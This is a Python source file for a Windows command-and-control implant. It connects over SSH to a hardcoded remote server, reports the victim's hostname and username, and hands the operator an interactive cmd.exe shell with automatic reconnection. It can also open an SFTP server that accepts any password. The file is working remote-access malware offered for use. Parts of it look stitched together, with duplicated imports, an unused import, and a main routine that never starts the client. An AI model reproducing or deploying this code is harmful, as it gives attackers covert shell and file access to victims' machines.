import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any
import winpty
from sftp_handler import SimpleSFTPHandler


logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Client')
logger = logging.getLogger('ClientSFTPServer')

# Generate a host key for the SFTP server
HOST_KEY = paramiko.RSAKey.generate(2048)

import paramiko
import os
import logging
from paramiko.sftp_handle import SFTPHandle
from paramiko.sftp_attr import SFTPAttributes

logger = logging.getLogger('ClientSFTPServer')
import paramiko
import os
import logging
import threading
import time
import socket

logger = logging.getLogger('SimpleSFTPServer')


# Complete standalone SFTP server
class StandaloneSFTPServer:
    def __init__(self, port=2222, host_key=None):
        self.port = port
        if host_key is None:
            self.host_key = paramiko.RSAKey.generate(2048)
        else:
            self.host_key = host_key
        self.sock = None
        self.server_thread = None
        self.running = False
        self.connections = []

    def start(self):
        """Start the SFTP server"""
        try:
            # Bind to all interfaces
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(('', self.port))
            self.sock.listen(5)
            
            self.running = True
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"SFTP server started on port {self.port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start SFTP server: {e}")
            if self.sock:
                self.sock.close()
                self.sock = None
            return False

    def stop(self):
        """Stop the SFTP server"""
        self.running = False
        
        # Close all connections
        for t in self.connections:
            try:
                t.close()
            except:
                pass
        self.connections = []
        
        # Close the socket
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
            
        logger.info("SFTP server stopped")
        return True

    def _run_server(self):
        """Accept and handle connections"""
        try:
            while self.running:
                try:
                    client_socket, addr = self.sock.accept()
                    logger.debug(f"New connection from {addr[0]}:{addr[1]}")
                    
                    # Handle connection in a new thread
                    t = threading.Thread(
                        target=self._handle_connection,
                        args=(client_socket, addr),
                        daemon=True
                    )
                    t.start()
                    self.connections.append(client_socket)
                except (OSError, socket.error) as e:
                    if not self.running:
                        break
                    logger.error(f"Socket error: {e}")
                    time.sleep(0.1)
        except Exception as e:
            logger.error(f"Server error: {e}")

    def _handle_connection(self, client_socket, addr):
        """Handle a client connection"""
        transport = None
        try:
            # Set up the SSH transport
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.host_key)
            
            # Use Paramiko's built-in SFTP server interface
            transport.set_subsystem_handler('sftp', paramiko.SFTPServer)
            transport.start_server(server=SFTPServerInterface())

            # Wait for client channel
            channel = transport.accept(20)
            if channel is None:
                logger.warning("No channel established")
                return

            # Keep connection alive until client disconnects
            while transport.is_active():
                time.sleep(0.1)
        except Exception as e:
            logger.error(f"Error handling connection: {e}")
        finally:
            if transport:
                try:
                    transport.close()
                except:
                    pass
            try:
                client_socket.close()
            except:
                pass
            if client_socket in self.connections:
                self.connections.remove(client_socket)


# Simple SSH server interface
class SFTPServerInterface(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        logger.debug(f"Channel request: {kind}")
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # Accept any auth for now - we're running on localhost
        logger.debug(f"Auth request for {username}")
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_subsystem_request(self, channel, name):
        logger.debug(f"Subsystem request: {name}")
        if name == 'sftp':
            return True
        return False
        
    def get_allowed_auths(self, username):
        return 'password'




class C2Client:
    """Windows C2 Client with PTY support"""
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()

    def _gather_system_info(self) -> Dict[str, str]:
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }
        return info
    
    def connect(self) -> bool:
        try:
            # Establish SSH connection as before
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            
            self.transport = self.ssh_client.get_transport()
            # Don't set up SFTP forward immediately - wait for command
                                                                
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()
            
            if self.channel.active:
                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']}\r\n"
                self.channel.send(client_info)
                logger.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        try:
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logger.error(f"Error starting shell: {e}")
            return False

    def resize_pty(self, cols: int, rows: int):
        try:
            if hasattr(self, 'pty'):
                self.pty.resize(cols, rows)
        except Exception as e:
            logger.error(f"Error resizing PTY: {e}")

    def forward_io(self):
        def read_from_process():
            try:
                while self.running and self.pty and self.channel and self.channel.active:
                    data = self.pty.read()
                    if data:
                        self.channel.send(data.encode())
            except Exception as e:
                logger.error(f"Process read error: {e}")

        def read_from_channel():
            try:
                while self.running and self.channel.active:
                    if self.channel.recv_ready():
                        data = self.channel.recv(1024).decode()
                        print(data)
                        if self.process_command(data):
                            continue 
                        if self.pty:
                            self.pty.write(data)
                    else:
                        time.sleep(0.05)
            except Exception as e:
                logger.error(f"Channel read error: {e}")
                self.running = False

        t1 = threading.Thread(target=read_from_process, name="ProcessReader")
        t2 = threading.Thread(target=read_from_channel, name="ChannelReader")
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()

        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)



        # Modified SFTP command handler for the C2Client class
    def process_command(self, command):
        """Process special commands before passing to shell"""
        cmd_parts = command.strip().split()
        if not cmd_parts:
            return False
            
        # Check for special commands
        if cmd_parts[0] == "!sftp":
            if len(cmd_parts) > 1 and cmd_parts[1] == "start":
                port = int(cmd_parts[2]) if len(cmd_parts) > 2 else 2222
                return self.start_standalone_sftp(port)
            elif len(cmd_parts) > 1 and cmd_parts[1] == "stop":
                return self.stop_standalone_sftp()
            else:
                self.channel.send("Usage: !sftp [start|stop] [port]\r\n")
                return True
        return False

    # New methods for the C2Client class
    def start_standalone_sftp(self, port=2222):
        """Start the standalone SFTP server"""
        try:
            # Notify the C2 server we need port forwarding
            # result = self.transport.request_port_forward('127.0.0.1', port)
            # if not result:
            #     self.channel.send(f"Failed to request port forwarding on port {port}\r\n")
            #     return False
                
            # Create and start the SFTP server
            self.sftp_server = StandaloneSFTPServer(port=port)
            if self.sftp_server.start():
                self.channel.send(f"SFTP server started on port {port}\r\n")
                return True
            else:
                self.transport.cancel_port_forward('', port)
                self.channel.send("Failed to start SFTP server\r\n")
                return False
        except Exception as e:
            self.channel.send(f"Error starting SFTP server: {str(e)}\r\n")
            return False

    def stop_standalone_sftp(self):
        """Stop the standalone SFTP server"""
        try:
            if hasattr(self, 'sftp_server') and self.sftp_server:
                port = self.sftp_server.port
                self.sftp_server.stop()
                self.sftp_server = None
                
                # Cancel port forwarding
                try:
                    self.transport.cancel_port_forward('', port)
                except:
                    pass
                    
                self.channel.send(f"SFTP server stopped on port {port}\r\n")
                return True
            else:
                self.channel.send("No SFTP server is running\r\n")
                return True
        except Exception as e:
            self.channel.send(f"Error stopping SFTP server: {str(e)}\r\n")
            return False
            
    def command_loop(self):
        while self.running:
            try:
                if not self.channel or not self.channel.active:
                    logger.info("Channel inactive, reconnecting...")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)
                    if not self.connect():
                        continue

                if self.channel.recv_ready():
                    command = self.channel.recv(1024).decode().strip()
                    
                    if not self.start_shell():
                        logger.error("Failed to start shell")
                        time.sleep(self.reconnect_delay)
                        continue

                    self.forward_io()
            except Exception as e:
                logger.error(f"Command loop error: {e}")
                self.disconnect()
                time.sleep(self.reconnect_delay)


    def disconnect(self):
        try:
            if self.process: self.process.terminate()
        except: pass

    def run(self):
        try:
            if self.connect():
                self.command_loop()
        finally:
            self.disconnect()


def parse_arguments():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
    parser.add_argument("--username", default="implant", help="Authentication username")
    parser.add_argument("--password", default="implant", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logger.setLevel(logging.DEBUG)
    config = {'server_ip': args.server, 'server_port': args.port, 'username': args.username, 'password': args.password}
    
    # Start the standalone SFTP server for testing
    sftp_server = StandaloneSFTPServer(port=2222)
    if sftp_server.start():
        logger.info("Standalone SFTP server is running. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Stopping SFTP server...")
            sftp_server.stop()
    else:
        logger.error("Failed to start the standalone SFTP server.")

if __name__ == '__main__':
    main()
